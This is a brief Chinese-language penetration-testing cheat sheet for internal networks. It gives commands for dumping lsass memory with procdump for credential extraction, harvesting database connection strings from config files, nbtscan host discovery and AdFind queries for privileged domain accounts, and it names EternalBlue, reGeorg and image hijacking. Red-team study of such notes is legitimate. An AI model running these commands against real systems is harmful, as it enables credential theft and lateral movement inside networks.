# 内网渗透

procdump+mimi抓取密码

```text
procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp
```

密码恢复软件

{% embed url="https://www.nirsoft.net/password\_recovery\_tools.html" %}

windows日志分析软件  -》 logparser

dde执行命令

regeorg asp的代理脚本

IIS管理命令工具appcmd，需要过UAC，可以ipc登录使用at命令执行定时任务或者提权

数据库信息收集

```text
findstr /S connectionString ***.config > ***.txt
```

网段存活主机探测

```text
nbtscan 网段
```

永恒系列漏洞工具包



镜像劫持

拓扑信息收集

vssdump 卷影复制

用adfind查找admincount=1

```text
受保护的用户
Adfind.exe -b DC=domain,DC=com -f "&(objectcategory=person)(samaccountname=*)(admincount=1)" –dn
受保护的组
Adfind.exe -b DC=domain,DC=com -f "&(objectcategory=group)(admincount=1)" -dn
```

